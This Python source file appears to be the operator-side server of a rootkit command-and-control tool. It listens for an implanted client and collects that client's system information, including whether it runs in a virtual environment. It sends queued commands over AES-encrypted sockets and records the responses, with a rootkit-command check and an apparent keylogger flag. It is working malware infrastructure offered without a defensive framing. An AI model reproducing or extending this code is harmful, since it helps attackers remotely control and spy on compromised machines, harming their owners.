1from utils.Crypto.CryptoHandler import CryptoHandler
2from utils.TCP.AESNetworkHandler import AESNetworkHandler
3from typing import Optional
4import config as cfg
5import socket
6import threading
7import queue
8import errno
9import json
10
11class Request:
12 def __init__(self, message: str, add_to_history: bool):
13 self.message = message
14 self.add_to_history = add_to_history
15 self.response: Optional[str] = None
16 self.event = threading.Event()
17
18class TCPServer:
19 def __init__(self, host: str = '0.0.0.0', port: int = 12345, crypto=None, owner=None):
20 self._owner = owner
21 self._host = host
22 self._port = port
23 self._crypto = crypto or CryptoHandler(cfg.AES_KEY, cfg.AES_IV)
24 self._network_handler = AESNetworkHandler(self._crypto)
25
26 self._server_socket: Optional[socket.socket] = None
27 self._client_socket: Optional[socket.socket] = None
28 self._client_ip: Optional[str] = None
29 self._client_sysinfo: Optional[dict] = {}
30
31 self._ip_lock = threading.Lock()
32 self._running = False
33
34 self._klg_on = False
35
36 self._send_queue: queue.Queue[Request] = queue.Queue()
37 self._recv_queue = queue.Queue()
38 self._server_thread = None
39
40 def start(self) -> None:
41 self._running = True
42 self._server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
43 self._server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
44 self._server_socket.bind((self._host, self._port))
45 self._server_socket.listen(1)
46
47 print(f"[TCP SERVER] Listening on {self._host}:{self._port}")
48 self._server_thread = threading.Thread(target=self._accept_client_loop, daemon=True)
49 self._server_thread.start()
50
51 def stop(self) -> None:
52 self._running = False
53 if self._server_socket:
54 self._server_socket.close()
55 with self._ip_lock:
56 self._client_ip = None
57 self._owner._authenticated = False
58 print("[TCP SERVER] Stopped cleanly.")
59
60 def send_to_client(self, message: str) -> Optional[str]:
61 req = Request(message, add_to_history=False)
62 self._send_queue.put(req)
63 req.event.wait(timeout=10)
64
65 if req.response is None or req.response is False:
66 print("[TCP SERVER] Failed to send command or no response received.")
67 # Empty sending queue
68 self._send_queue.queue.clear()
69 print("[TCP SERVER] Sending queue cleared due to error.")
70 return None
71
72
73 return req.response
74
75 def send_to_client_with_history(self, message: str) -> Optional[str]:
76 req = Request(message, add_to_history=True)
77 self._send_queue.put(req)
78 req.event.wait(timeout=10)
79
80 if req.response is None or req.response is False:
81 print("[TCP SERVER] Failed to send command or no response received.")
82 # Empty sending queue
83 self._owner._update_command_history(req.message, "", tcp_error="[TCP ERROR] No response received.")
84 self._send_queue.queue.clear()
85 print("[TCP SERVER] Sending queue cleared due to error.")
86 return None
87
88
89 return req.response
90
91 def receive_from_client(self) -> Optional[str]:
92 try:
93 return self._recv_queue.get_nowait()
94 except queue.Empty:
95 return None
96
97 def get_client_ip(self) -> Optional[str]:
98 with self._ip_lock:
99 return self._client_ip
100
101 def get_listening_port(self) -> int:
102 if self._server_socket:
103 return self._server_socket.getsockname()[1]
104 return 0
105
106 def get_client_sysinfo(self) -> Optional[dict]:
107 with self._ip_lock:
108 return self._client_sysinfo if self._client_sysinfo else None
109
110 def is_running(self) -> bool:
111 return self._running
112
113 def is_client_connected(self) -> bool:
114 with self._ip_lock:
115 return self._client_ip is not None
116
117 def _is_socket_closed(self, sock: socket.socket) -> bool:
118 try:
119 sock.settimeout(0.5)
120 try:
121 data = sock.recv(1, socket.MSG_PEEK)
122 if data == b'':
123 return True
124 except socket.timeout:
125 return False
126 except socket.error as e:
127 if e.errno in [errno.ECONNRESET, errno.EBADF, errno.ENOTCONN]:
128 return True
129 elif e.errno in [errno.EWOULDBLOCK, errno.EAGAIN]:
130 return False
131 return False
132
133 def _accept_client_loop(self) -> None:
134 while self._running:
135 try:
136 print("[TCP SERVER] Waiting for connection...")
137 self._client_socket, client_addr = self._server_socket.accept()
138 with self._ip_lock:
139 self._client_ip = client_addr[0]
140 print(f"[TCP CONNECTED] Client IP: {self._client_ip}")
141
142 # When connected, client send its sysinfo
143 get_sysinfo = self._network_handler.receive(self._client_socket)
144 parsed_sysinfo = json.loads(get_sysinfo)
145 self._client_sysinfo = parsed_sysinfo
146 # search for key "virtual_env" and transform it to a boolean
147 if "virtual_env" in self._client_sysinfo:
148 self._client_sysinfo["virtual_env"] = bool(self._client_sysinfo["virtual_env"])
149
150 print(f"[TCP SYSINFO] Client sysinfo: {self._client_sysinfo}")
151
152 self._handle_client()
153
154 self._cleanup_after_disconnect()
155 except Exception as e:
156 print(f"[TCP MAIN LOOP ERROR] {e}")
157
158 def _handle_client(self) -> None:
159 request = None
160 try:
161 while self._running:
162 # Log: Checking if the socket is still connected
163 if self._client_socket is None or self._is_socket_closed(self._client_socket):
164 print("[TCP SOCKET] Client disconnected.")
165 break
166
167 # Log: Attempting to retrieve a request from the queue
168 try:
169 request: Request = self._send_queue.get(timeout=1)
170 except queue.Empty:
171 continue
172
173 if request is None:
174 continue
175
176 # --- Sending the command ---
177 success = self._network_handler.send(self._client_socket, request.message)
178 if not success:
179 tcp_error = "[TCP ERROR] Failed to send command."
180 print(tcp_error)
181 if request.add_to_history:
182 self._owner._update_command_history(request.message, "", tcp_error=tcp_error)
183 request.event.set()
184 continue
185
186 print(f"[TCP SENT] {request.message[:128]}")
187
188 # --- Receiving the response ---
189 response = self._network_handler.receive(self._client_socket)
190 if response is False:
191 tcp_error = "[TCP ERROR] Failed to receive response."
192 print(tcp_error)
193 if request.add_to_history:
194 self._owner._update_command_history(request.message, "", tcp_error=tcp_error)
195 request.event.set()
196 continue
197
198 print(f"[TCP RECEIVED] {response[:128]}")
199
200 # --- Post-processing ---
201 self._recv_queue.put(response)
202 self._owner._check_rootkit_command(response)
203
204 if request.add_to_history:
205 self._owner._update_command_history(request.message, response)
206
207 request.response = response
208 request.event.set()
209
210 except socket.timeout:
211 tcp_error = "[TCP SOCKET TIMEOUT] No data received in the last 2 seconds."
212 print(tcp_error)
213 if request and request.add_to_history:
214 self._owner._update_command_history(request.message if request else "", "", tcp_error=tcp_error)
215
216 except Exception as e:
217 tcp_error = f"[TCP EXCEPTION] An error occurred: {e}"
218 print(tcp_error)
219 if request and request.add_to_history:
220 self._owner._update_command_history(request.message if request else "", "", tcp_error=tcp_error)
221
222
223 def _cleanup_after_disconnect(self) -> None:
224 print("[TCP SERVER] Client disconnected.")
225 with self._ip_lock:
226 self._client_ip = None
227 self._client_socket = None
228 self._owner._authenticated = False
229 self._command_history = []
230 self._owner.reset_command_history()
231
232 if self._client_socket:
233 try:
234 self._client_socket.shutdown(socket.SHUT_RDWR)
235 self._client_socket.close()
236 except Exception as e:
237 print(f"[ERROR] Failed to close client socket: {e}")
238 self._client_socket = None
